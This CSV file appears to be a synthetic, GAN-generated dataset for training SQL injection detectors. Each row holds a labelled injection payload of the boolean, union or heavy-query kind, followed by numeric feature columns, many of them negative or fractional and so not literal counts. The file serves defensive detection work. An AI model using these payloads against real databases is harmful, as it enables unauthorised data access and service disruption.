id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000142,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R001976,9.43391340405514,142.4038543701172,82.6793441772461,15.402042388916016,98.78130340576172,4.236968040466309,61.997745513916016,25.88933563232422,0.9997462630271912,0.6730552911758423,-0.2373979389667511,0.32836368680000305,0.12198340892791748,3.4255685806274414,0.8738642334938049,1.9141241312026978,-0.43455713987350464,0.6018868088722229,-0.20820841193199158,-0.1310364156961441,8.869564056396484,13.58698558807373,3.8726251125335693,0.020417163148522377,0.8148226737976074,0.23514504730701447,-0.02055300585925579,0.7552967071533203,0.18935327231884003,1.6147316694259644,-0.08710785210132599,0.07254542410373688,-0.4568317234516144,0.09179288148880005,0.9121809005737305,0.6564862132072449,0.23135069012641907,0.7472048401832581,-0.12937815487384796,0.23453937470912933,-0.18113084137439728,1.4546035528182983,0.5035654306411743,0.21801497042179108,0.21304763853549957,-0.019094891846179962,0.06802623718976974,-0.28603968024253845,0.13224837183952332,-0.028353778645396233,0.4585781991481781,0.0490577407181263,0.0539705827832222,0.09405132383108139,0.12187851220369339,0.01163573283702135,0.2287067472934723,0.2100578248500824,-0.09981734305620193,-0.4424535930156708,0.0029565864242613316,0.5535160303115845,0.0037924470379948616,-0.18475070595741272,0.3760342299938202,-0.032733991742134094,-0.37803465127944946,-0.22777150571346283,-0.2861960530281067,0.006854080129414797,-0.008982628583908081,0.0005197197897359729,-0.006536239292472601,-0.0019909804686903954,-0.010417940095067024,0.1356530487537384,1.8824716806411743,1.068237543106079,0.0013434912543743849,0.047802478075027466,-0.1282612383365631,2.2639682292938232,1.5934151411056519,-0.694294273853302,0.5632056593894958,-0.13109004497528076,-0.24432124197483063,-0.36923518776893616,0.07787365466356277
GAN_000143,attack,boolean,"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",nearest_attack_euclidean,R005077,9.459268792783456,64.16022491455078,-31.759876251220703,59.8416748046875,87.31705474853516,1.7178298234939575,78.52754211425781,13.426986694335938,1.0010643005371094,-0.18337030708789825,0.49613794684410095,0.574790894985199,0.17482157051563263,2.865044116973877,3.814969778060913,0.5481544137001038,2.6647610664367676,0.12957800924777985,0.1043330579996109,0.08724994957447052,6.61434268951416,13.240833282470703,0.4205678403377533,-0.009364796802401543,1.851288914680481,0.06939247995615005,0.002261343877762556,0.13536998629570007,1.4228708744049072,-0.05772990733385086,0.17160892486572266,-0.0037314065266400576,-0.028851186856627464,1.1145082712173462,1.3911268711090088,1.4009119272232056,-2.8306386470794678,1.0961092710494995,-1.6266814470291138,-0.005281150806695223,0.7832309603691101,-0.998153567314148,-0.35489076375961304,0.4319917559623718,-0.024459412321448326,-0.00699306046590209,0.06104999780654907,0.7966539859771729,0.11185890436172485,-0.0015863011358305812,0.785346508026123,-0.141091451048851,-0.48852694034576416,-0.037621285766363144,-0.040594153106212616,-0.011338883079588413,-0.023966334760189056,0.08149990439414978,-0.06998936086893082,-0.5818568468093872,0.009738344699144363,1.2271424531936646,-0.023088466376066208,-0.5328835248947144,0.12870457768440247,0.016464034095406532,-0.13179560005664825,0.2701466679573059,0.626409113407135,-0.013851209543645382,0.00738973543047905,-0.008388586342334747,0.0095438277348876,0.06571608036756516,-0.014357089065015316,0.2170630693435669,0.39895710349082947,0.9126664996147156,0.007207944057881832,0.07929625362157822,-0.07363157719373703,8.248658180236816,0.5808444023132324,-0.22264240682125092,-0.20736131072044373,0.05913778021931648,-0.0753980278968811,0.28168001770973206,0.08134794980287552
GAN_000144,attack,boolean,"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R005500,5.00016563799341,142.7158660888672,60.6298713684082,18.763975143432617,65.14408111572266,2.971674680709839,52.20571517944336,21.539756774902344,0.9998644590377808,0.5161965489387512,-0.004466343205422163,0.3353988528251648,0.13631464540958405,3.5170176029205322,0.6384624242782593,1.2992360591888428,0.5723035931587219,0.35980165004730225,-0.020452182739973068,-0.052526213228702545,4.863378047943115,8.601698875427246,3.0092811584472656,0.011267420835793018,1.1436359882354736,0.11992216110229492,-0.012600868009030819,0.5891700983047485,0.36481159925460815,1.063663125038147,0.010633532889187336,0.02475481666624546,-0.018420612439513206,0.04869842529296875,0.7683671116828918,0.98807692527771,2.8003039360046387,0.6185315251350403,0.3616414964199066,0.2285393476486206,0.08616366237401962,0.7427420020103455,0.2593197524547577,0.15627044439315796,0.07270072400569916,0.006700057070702314,0.045191336423158646,-0.09461913257837296,0.10765745490789413,0.07380335032939911,0.371903657913208,0.08887728303670883,-0.15374383330345154,0.05153633654117584,0.10043668746948242,0.009492470882833004,0.10793503373861313,0.14249154925346375,-0.05053665116429329,-0.1664733737707138,0.0013398230075836182,0.3420136570930481,0.0012404231820255518,0.7002933621406555,0.18389713764190674,-0.03852740675210953,-0.15101443231105804,-0.11368820816278458,-0.07074373960494995,0.004423308651894331,0.005824686959385872,-0.001229136367328465,-0.0011331604328006506,0.010138570331037045,0.0005559668061323464,0.09402219951152802,1.0615688562393188,0.7655619978904724,0.004924702923744917,0.07752237468957901,-0.030829932540655136,4.259021759033203,0.9891856908798218,-0.22627027332782745,0.36066603660583496,0.006750773638486862,-0.117335744202137,-0.08967527747154236,0.03163338825106621
GAN_000145,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R003086,5.0298514956787095,17.748865127563477,-0.4200708568096161,22.339113235473633,23.56626319885254,0.8492875695228577,31.839988708496094,7.172656059265137,1.0011422634124756,0.13737298548221588,0.23847325146198273,0.38299447298049927,0.14728355407714844,3.1140291690826416,3.0270626544952393,0.33839133381843567,0.6717832684516907,0.3942815959453583,0.038927868008613586,0.003517269156873226,2.8846943378448486,5.1023149490356445,0.7396029829978943,0.0200662761926651,1.034575343132019,0.05940992012619972,0.007832545787096024,0.04285706579685211,1.1048932075500488,0.30538785457611084,0.05726185068488121,-0.029884371906518936,0.4046868681907654,0.6133295893669128,0.8141666054725647,0.7672712206840515,-3.3859641551971436,0.8631460070610046,-0.47206589579582214,0.0799051821231842,0.4966604709625244,-0.180283784866333,0.14031995832920074,0.18880076706409454,0.04353497177362442,0.0213803518563509,0.017275042831897736,0.3394939601421356,0.08113259822130203,0.10235382616519928,0.11436954140663147,-0.018140049651265144,0.031362384557724,-0.006834207568317652,-0.03183341026306152,0.011735687963664532,0.04934975504875183,0.17333753407001495,-0.043615005910396576,-0.36870527267456055,0.00523191224783659,0.7512100338935852,0.004752568434923887,-0.5327969789505005,0.0889887809753418,0.03037315607070923,-0.13545753061771393,-0.08099311590194702,0.08852928876876831,-0.0016187173314392567,-0.0074280439876019955,-0.010023458860814571,0.0029811232816427946,-0.029110414907336235,-0.015358328819274902,0.135609969496727,0.8194255232810974,0.4172299802303314,-0.0007240997510962188,-0.01605035550892353,-0.13537384569644928,3.3323585987091064,0.5911169648170471,-0.022806309163570404,0.14340713620185852,0.16007156670093536,-0.08282499015331268,0.1308576762676239,0.05495321378111839
GAN_000146,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003883,5.915012449750175,33.942726135253906,42.413536071777344,10.252949714660645,37.52509689331055,0.5612704753875732,44.771060943603516,16.124845504760742,1.0012041330337524,0.38439586758613586,0.09488848596811295,0.2518828809261322,0.15816396474838257,3.3549458980560303,0.2631452977657318,0.9696971774101257,1.8760312795639038,0.4212549924850464,0.04728080704808235,-0.020474860444664955,4.878839492797852,5.470254421234131,1.8087728023529053,0.0131600396707654,0.5105065107345581,0.09692325443029404,-0.042069293558597565,0.56148362159729,-0.6381057500839233,1.3515076637268066,0.003237123368307948,0.02070523053407669,0.15002544224262238,0.010859470814466476,1.6701096296310425,0.7279379367828369,0.20036986470222473,-0.09668920934200287,0.1275285929441452,0.11976778507232666,0.3420805335044861,0.6628955006599426,0.40779349207878113,0.10664880275726318,0.061014022678136826,0.03526868671178818,0.056962914764881134,-0.29644423723220825,-0.11831643432378769,-0.16675113141536713,-0.017601722851395607,-0.2060704082250595,0.23037773370742798,-0.03861186280846596,-0.0008152128430083394,-0.05021468922495842,0.1335355043411255,0.1920636147260666,-0.05671161785721779,-0.022046580910682678,0.00716378865763545,0.5228389501571655,-0.00037368477205745876,0.32387080788612366,0.24172085523605347,-0.04143073409795761,-0.2432301938533783,-0.813491702079773,-0.43155786395072937,-0.0030754513572901487,0.04038166627287865,-0.006574627943336964,-4.467456165002659e-05,0.017749926075339317,-0.0006122076301835477,0.1612449735403061,0.7679204940795898,1.1718120574951172,-0.012057074345648289,-0.009028689935803413,-0.17198769748210907,1.6958874464035034,1.0450841188430786,-0.17056508362293243,0.14911139011383057,0.2924423813819885,-0.23417659103870392,0.30938032269477844,0.022357290610671043
GAN_000147,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R006054,6.063371918997113,134.11024475097656,41.07355499267578,25.638565063476562,39.33641052246094,1.1418944597244263,41.10934066772461,12.280012130737305,0.998945951461792,0.35865727066993713,0.06892896443605423,0.2783466875553131,0.09976696223020554,3.0404999256134033,2.709548234939575,0.5355268120765686,-0.8186216950416565,0.474548876285553,-0.06968307495117188,-0.06322356313467026,2.5951285362243652,7.468677520751953,3.720189094543457,-0.009680287912487984,0.30408987402915955,0.09481102228164673,-0.01479905191808939,-0.2679503858089447,1.1637036800384521,0.38030683994293213,-0.07613550871610641,-0.02265970967710018,0.05479494854807854,0.6590927243232727,0.3220539093017578,0.36713021993637085,-2.4876344203948975,1.3510774374008179,0.3579305112361908,0.45341116189956665,0.1789257824420929,0.35876327753067017,0.2432505339384079,0.17315682768821716,0.14062798023223877,-0.02354830875992775,0.048605192452669144,0.2144065797328949,0.3952421247959137,0.31065642833709717,0.35728541016578674,0.10769490152597427,-0.10689158737659454,0.03949357196688652,0.017505737021565437,0.0512663908302784,0.10874925553798676,0.33501511812210083,-0.040306009352207184,-0.43211257457733154,0.004976037424057722,0.3448677659034729,0.018014879897236824,-0.050699733197689056,0.1413419395685196,0.0596642903983593,-0.09855255484580994,0.25331491231918335,0.16089946031570435,0.0041779023595154285,-0.05278993397951126,0.000961524376180023,0.0010782598983496428,-0.056225381791591644,-0.02496088668704033,0.034212805330753326,1.1502983570098877,-0.09153246879577637,0.013360713608562946,0.11611107736825943,-0.10448550432920456,2.2246382236480713,0.554047703742981,0.1780044436454773,0.19977940618991852,-0.07663098722696304,-0.02055784873664379,-0.5591733455657959,0.07750687003135681
GAN_000148,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005293,4.916242909106688,70.79756164550781,51.99329376220703,19.24067497253418,10.993404388427734,0.9480786323547363,21.74028205871582,10.157173156738281,0.9997103214263916,0.45623621344566345,0.1334153413772583,0.16050101816654205,0.10240079462528229,2.96411395072937,-0.1770465224981308,0.8519267439842224,1.462758183479309,0.40308207273483276,0.0983094796538353,-0.06607964634895325,1.3499438762664795,3.0895144939422607,5.127605438232422,0.01336994394659996,-0.2385762631893158,0.08273563534021378,-0.00890228059142828,0.4084295630455017,-0.06399785727262497,0.7032659649848938,-0.03622903674840927,-0.012579339556396008,-0.2871392071247101,0.032446131110191345,1.1082751750946045,-0.04593496397137642,1.8170908689498901,0.22207583487033844,0.9935590624809265,0.8947877883911133,0.11179514974355698,0.16738204658031464,0.1192532405257225,0.11048385500907898,0.03189462423324585,-0.07031242549419403,0.0368526391685009,-0.22354988753795624,0.19651958346366882,0.27150893211364746,0.21769464015960693,-0.0010332193924114108,-0.22114630043506622,0.036887168884277344,0.07911984622478485,-0.011703294701874256,0.11241966485977173,0.304457426071167,-0.03503287956118584,-0.46954330801963806,0.004923556465655565,0.4436582326889038,0.006144776940345764,-0.1775820553302765,0.18107450008392334,0.016484003514051437,-0.10355392098426819,-0.33854788541793823,-0.06699199229478836,0.000882643973454833,-0.0023677623830735683,-0.0029037590138614178,-0.0008078761165961623,-0.04580385610461235,0.003927759360522032,0.09971734881401062,0.11458057165145874,0.4489651620388031,0.020659305155277252,0.17053964734077454,0.03513629734516144,2.3715767860412598,0.26526734232902527,0.5243204832077026,-0.16467547416687012,0.09227149933576584,-0.08032145351171494,-0.04019384831190109,0.024485720321536064
GAN_000149,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R002932,5.8826153074200445,-19.1289119720459,-18.647777557373047,25.777015686035156,-19.94152069091797,-0.50246262550354,8.644269943237305,1.2612533569335938,1.0006767511367798,0.12513533234596252,0.42636922001838684,0.2321036458015442,0.116099052131176,2.5946686267852783,1.919137954711914,-0.4445284605026245,1.5605692863464355,0.5864418745040894,0.09932192414999008,0.022778650745749474,0.6516568660736084,1.2485456466674805,2.958735466003418,0.018376225605607033,-0.4354114234447479,0.03334929794073105,-0.008621948771178722,-0.4098761975765228,0.8669061660766602,-0.13549207150936127,-0.04203430563211441,-0.04118688777089119,-0.15039068460464478,0.7609333395957947,1.3874505758285522,0.02730102650821209,-4.266886234283447,0.3967249095439911,0.013157588429749012,0.7273761034011841,0.6831726431846619,-0.6553672552108765,-0.01806521788239479,0.1660599708557129,0.025072921067476273,-0.024941105395555496,-0.008186748251318932,0.1867947280406952,0.06833736598491669,0.16391117870807648,0.004764815792441368,-0.1865367442369461,-0.08372919261455536,-0.019556520506739616,-0.05000077933073044,-0.012557505629956722,0.059813689440488815,0.3933957517147064,0.005595236085355282,-0.3891814351081848,0.0039606657810509205,1.167279601097107,0.014061740599572659,-0.05777909606695175,0.10285013169050217,0.0847720056772232,-0.08857609331607819,0.031037047505378723,0.15946686267852783,-0.008690133690834045,-0.024318331852555275,-0.007176149636507034,0.007629111409187317,-0.03413105010986328,-0.0276431106030941,0.14341133832931519,-0.17816874384880066,0.2328179031610489,0.009237416088581085,0.13010768592357635,-0.14076095819473267,2.4659693241119385,-0.03530143201351166,0.7201982736587524,-0.2762638032436371,0.18344299495220184,-0.0995037779211998,0.1849377602338791,0.06400472670793533
GAN_000150,attack,boolean,-3496'   )    )    or 9323  =  9323#,nearest_attack_euclidean,R002318,8.49129406795155,-62.07439422607422,-49.36592483520508,34.932029724121094,12.440807342529297,1.3002238273620605,38.0584602355957,-0.5495872497558594,1.0019463300704956,-0.18118079006671906,0.46972906589508057,0.47108936309814453,0.17038509249687195,2.7171432971954346,5.00120735168457,0.14520946145057678,1.4938722848892212,0.40083417296409607,0.18030789494514465,0.028679460287094116,3.4132397174835205,7.624772548675537,0.22030076384544373,0.020263440907001495,1.2394862174987793,0.04316097870469093,-0.023211920633912086,-0.1876843422651291,1.3703858852386475,-0.015707917511463165,0.08741535991430283,-0.03511027991771698,0.6740092635154724,1.1713814735412598,1.48423171043396,0.6073640584945679,-7.451458930969238,0.9187803864479065,-1.3951507806777954,0.1690942943096161,0.8257970809936523,-1.141859531402588,-0.1107519343495369,0.3855133056640625,0.0070575266145169735,0.03375452011823654,0.06342916935682297,0.552422285079956,0.11226240545511246,0.11284248530864716,0.0494835264980793,-0.1947258561849594,0.08790169656276703,-0.049145255237817764,-0.09407617151737213,-0.00762220798060298,0.03621506318449974,0.1289111077785492,-0.08163265138864517,-0.6325889825820923,0.0020576738752424717,1.5317670106887817,0.0012506440980359912,-1.770339846611023,0.09644678235054016,0.027837129309773445,-0.16161909699440002,-0.19686345756053925,0.3747011721134186,-0.008645479567348957,-0.0006743636331520975,-0.014845998957753181,0.009357898496091366,-0.019450457766652107,-0.02165047638118267,0.16465634107589722,0.594735324382782,0.7243907451629639,0.001207265304401517,-0.11166013777256012,-0.20384550094604492,4.898275852203369,0.5095009803771973,-0.16140197217464447,0.028859617188572884,0.2916356921195984,-0.10468560457229614,0.6449187994003296,0.09696658700704575
GAN_000151,attack,boolean,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002148,4.937035054122725,106.8873062133789,63.29538345336914,9.779417037963867,31.395729064941406,1.6651687622070312,38.30359649658203,16.398466110229492,1.0003501176834106,0.5312483310699463,0.01122519001364708,0.249882772564888,0.12078145146369934,3.339231491088867,0.07447721064090729,1.4162907600402832,0.7344911694526672,0.4697384536266327,-0.01902013272047043,-0.051255952566862106,4.535436630249023,5.422670364379883,3.579742908477783,-0.0019607143476605415,0.3994801938533783,0.09466085582971573,-0.0036460659466683865,0.43049463629722595,-0.18122921884059906,1.2041865587234497,-0.03454553335905075,0.01440007146447897,0.02619657851755619,-0.008085891604423523,0.9796125292778015,0.7170879244804382,1.6154918670654297,0.28664591908454895,0.6522195935249329,0.26000356674194336,0.17390841245651245,0.7911735773086548,0.39413610100746155,0.0973939374089241,0.09444600343704224,0.01322066131979227,0.036041028797626495,-0.25165003538131714,0.07479776442050934,0.08463048189878464,0.20684657990932465,-0.03419138863682747,-0.04019768536090851,0.04709365963935852,0.06947939842939377,-0.017015255987644196,0.11260487884283066,0.19176089763641357,-0.034435827285051346,-0.09733118116855621,0.00648571876809001,0.4798370599746704,0.005783332511782646,0.9172149300575256,0.20971406996250153,-0.04224647209048271,-0.1318405568599701,-0.23369748890399933,-0.09081538021564484,0.003977052867412567,0.022183626890182495,-0.001513306051492691,-0.0010419980389997363,-0.009399195201694965,-0.0009365140576846898,0.08479980379343033,0.7729838490486145,0.7718291282653809,-0.0008892511832527816,0.053490061312913895,-0.07364629209041595,1.9300936460494995,0.9307541251182556,-0.006194703746587038,0.22557474672794342,0.13118933141231537,-0.14413465559482574,0.22817756235599518,0.030037185177206993
GAN_000152,attack,boolean,-7941 or   (  5822  =  8754  )  *8754-- eepn,nearest_attack_euclidean,R001200,7.446792652566753,-13.36258602142334,0.6863210797309875,21.319454193115234,47.60747146606445,0.1837567389011383,60.55918884277344,7.75163459777832,1.0026763677597046,0.11461798846721649,0.25847959518432617,0.35716745257377625,0.21555298566818237,3.344219923019409,0.9799341559410095,0.8002581596374512,3.068603038787842,0.34869521856307983,0.13582007586956024,0.027986466884613037,5.14299201965332,8.629956245422363,1.26422119140625,0.003421829780563712,1.0943886041641235,0.08813545107841492,-0.10812956094741821,0.7407344579696655,-0.7087978720664978,1.2728794813156128,0.06848401576280594,-0.0007350674131885171,0.23071949183940887,0.1228112131357193,2.06060791015625,0.8337769508361816,-1.0196964740753174,-0.1890113800764084,-0.8738476634025574,0.08231697976589203,0.48087984323501587,-0.004082106053829193,0.15133176743984222,0.1408757120370865,-0.04128740727901459,0.05675535276532173,0.06656935065984726,-0.2540731728076935,-0.19287823140621185,-0.28675538301467896,-0.11676489561796188,-0.3663282096385956,0.1635102778673172,-0.10429751127958298,0.009530624374747276,-0.060221679508686066,0.08618708699941635,0.1776227504014969,-0.07514025270938873,-0.061460137367248535,0.006210331805050373,1.028287410736084,-0.009311847388744354,-0.5017279982566833,0.20351575314998627,-0.06023677438497543,-0.37009915709495544,-0.8375129103660583,-0.3522888422012329,-0.004734689369797707,0.026008309796452522,-0.009917532093822956,0.0028650639578700066,0.034438539296388626,0.008017945103347301,0.19690915942192078,0.5799957513809204,1.8530383110046387,-0.015322965569794178,-0.12115314602851868,-0.15741875767707825,3.420597553253174,1.2668483257293701,-0.20944355428218842,0.18339578807353973,0.31553998589515686,-0.2917378544807434,0.8157514929771423,0.025425203144550323
GAN_000153,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006953,3.8401164880935803,81.15394592285156,26.73128318786621,21.037874221801758,35.7881965637207,-0.2204003632068634,34.66931915283203,15.085726737976074,1.0010098218917847,0.2670074999332428,0.22457827627658844,0.3411947786808014,0.14805667102336884,3.3374204635620117,1.685100793838501,0.739769697189331,1.2954075336456299,0.2775541841983795,0.05409945547580719,0.012429960072040558,4.889255046844482,4.7169880867004395,1.49467933177948,0.007476556580513716,0.9024717807769775,0.03848826885223389,0.0161666888743639,0.2198028564453125,-0.12838177382946014,0.5988958477973938,0.03421887755393982,-0.008561765775084496,0.24639813601970673,0.21639104187488556,0.9457666277885437,1.1130084991455078,0.30446627736091614,0.5531895160675049,0.37125036120414734,0.1492885947227478,0.4153686463832855,0.21156719326972961,0.15023496747016907,0.10156279802322388,0.02890286035835743,0.024397794157266617,0.01473026443272829,0.13919144868850708,0.0335669107735157,0.06634414941072464,0.10114449262619019,-0.03811604157090187,0.1358199119567871,-0.004582386929541826,-0.004659874364733696,-0.022504717111587524,0.057078275829553604,-0.0025470962282270193,-0.01290073711425066,0.009504392743110657,0.0009705726988613605,0.33784613013267517,0.0013557368656620383,0.0878070667386055,0.11573824286460876,-0.0017827324336394668,-0.07675647735595703,-0.23349598050117493,-0.07236017286777496,-0.002702854573726654,0.026443544775247574,-0.001774627366103232,0.0017520802794024348,0.019216904416680336,-0.00243254448287189,0.06827616691589355,0.5053781270980835,0.7208181619644165,-0.004744751378893852,0.022521300241351128,-0.03488658741116524,3.801273822784424,0.6322991847991943,0.03497908264398575,0.10688813030719757,0.19906732439994812,-0.07813354581594467,0.24443437159061432,0.02229604497551918
GAN_000154,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004632,6.254073889449422,61.33023452758789,52.625179290771484,24.67571258544922,35.931053161621094,2.3013558387756348,24.407041549682617,19.18862533569336,1.0000227689743042,0.4645346999168396,0.13089701533317566,0.2065894454717636,0.11495089530944824,2.8587563037872314,0.20490141212940216,1.274328351020813,1.4208693504333496,0.41772085428237915,0.05036274716258049,-0.07514835894107819,3.449561834335327,5.526547908782959,5.339881896972656,0.04010866582393646,-0.03082428127527237,0.13328023254871368,0.030694833025336266,0.7366105914115906,-0.022106461226940155,0.766426146030426,-9.522704203845933e-05,0.020684171468019485,-0.43751993775367737,0.015391495078802109,1.413283109664917,0.060645174235105515,2.7195870876312256,-0.0694236010313034,0.6895898580551147,1.0264991521835327,0.0443296954035759,0.11806241422891617,0.014227642677724361,0.21157695353031158,0.06698204576969147,-0.09090152382850647,0.04203931987285614,-0.1245417520403862,0.09482725709676743,0.16477730870246887,0.25488197803497314,0.09429214149713516,-0.1290065199136734,0.07911329716444016,0.1235576644539833,-0.01522864494472742,0.16388173401355743,0.12127852439880371,-0.06388302892446518,-0.7832561731338501,-8.14672457636334e-05,0.33821865916252136,0.0020125415176153183,-0.7043615579605103,0.2602687478065491,0.03106977418065071,-0.0827612429857254,-0.4483878016471863,-0.1999959647655487,-0.0030629008542746305,0.001821305020712316,-0.00680877547711134,-0.005872698966413736,-0.021358374506235123,0.01589381694793701,0.17057515680789948,0.34878650307655334,0.6690642237663269,0.021345680579543114,0.20121519267559052,0.09815123677253723,3.8033688068389893,0.34243330359458923,0.2719695270061493,-0.17661339044570923,0.0614037811756134,-0.10325054824352264,-0.3461606800556183,0.016764750704169273
GAN_000155,attack,boolean,"1""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008487,7.6658546212456,214.04347229003906,53.79814529418945,49.7313232421875,83.21845245361328,-0.76212477684021,42.39856719970703,31.737018585205078,0.999794602394104,0.3686991333961487,0.3110305368900299,0.3723198175430298,0.08981624245643616,2.909602165222168,1.9019862413406372,2.0209949016571045,1.1945074796676636,0.2691914141178131,0.03026413917541504,0.033758144825696945,9.901243209838867,9.707436561584473,4.934890270233154,-0.007415251340717077,0.19416657090187073,0.05769091844558716,0.14148958027362823,0.17078107595443726,-0.02064403146505356,0.11624046415090561,0.06688559055328369,0.047767333686351776,-0.6179644465446472,0.4624827802181244,1.0340161323547363,1.2852213382720947,3.9313440322875977,0.5560706853866577,1.0985710620880127,0.8194335699081421,0.3582026958465576,0.14366662502288818,-0.35331329703330994,0.21987879276275635,0.08157992362976074,-0.0708806961774826,0.01639510877430439,0.5122451186180115,0.2507312595844269,0.359487920999527,0.7604618668556213,0.136716827750206,-0.16311033070087433,0.1364506334066391,0.11863924562931061,-0.025724194943904877,0.07818379253149033,-0.1691366583108902,0.0010514890309423208,-0.23703983426094055,-0.0040470147505402565,0.29392361640930176,-0.00782744213938713,0.1643286943435669,0.28166133165359497,0.028227953240275383,0.17767031490802765,0.4282217025756836,0.25409767031669617,-0.011264301836490631,0.040122177451848984,0.007560225203633308,-0.003044129814952612,0.09670798480510712,0.006484718527644873,0.006886816117912531,0.05795768275856972,0.4427565336227417,0.020912032574415207,0.2401944398880005,0.19209083914756775,7.680054187774658,0.04479189217090607,0.20631231367588043,-0.2940288186073303,0.0211036317050457,0.052477579563856125,-0.25535792112350464,0.023061607033014297
GAN_000156,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,4.791491671857076,128.95968627929688,58.69621658325195,16.818897247314453,38.60102462768555,2.8726930618286133,57.575321197509766,16.23116683959961,0.9997269511222839,0.484338641166687,0.04502886161208153,0.23207497596740723,0.1294878125190735,3.3834404945373535,0.06982304155826569,0.9284986853599548,1.230452299118042,0.33350756764411926,0.03791788965463638,-0.056847576051950455,2.228379249572754,6.957170009613037,3.83586049079895,0.009003850631415844,0.8997078537940979,0.10304117202758789,-0.06278110295534134,0.5606167912483215,0.3904281556606293,0.9866087436676025,-0.0013787124771624804,-0.0003235407639294863,0.024527529254555702,0.13044169545173645,1.0241025686264038,0.4179706573486328,2.1753690242767334,0.3053183853626251,0.5617417097091675,0.49924957752227783,0.15265759825706482,0.5964665412902832,0.1981077492237091,0.14970949292182922,0.026623543351888657,0.012599552981555462,0.049816347658634186,-0.22163836658000946,0.16663071513175964,0.09879720211029053,0.3298913836479187,0.012514335103332996,-0.3144623041152954,0.018471967428922653,0.09765647351741791,0.009681148454546928,0.09377742558717728,0.42740944027900696,-0.066886305809021,-0.25656551122665405,0.005477128084748983,0.5301145315170288,0.0039560748264193535,0.5718456506729126,0.15760940313339233,-0.04209261015057564,-0.11095486581325531,-0.3698778748512268,0.020379964262247086,0.0037113225553184748,-0.0039357817731797695,-0.00323533546179533,0.0017790010897442698,-0.04168747738003731,-0.0018942879978567362,0.11704622954130173,0.7787504196166992,0.6681587100028992,0.015018130652606487,0.09467371553182602,-0.05399837717413902,3.7234866619110107,0.854394793510437,0.11308951675891876,0.21658970415592194,0.06820281594991684,-0.1178809180855751,0.0018491335213184357,0.03540002182126045
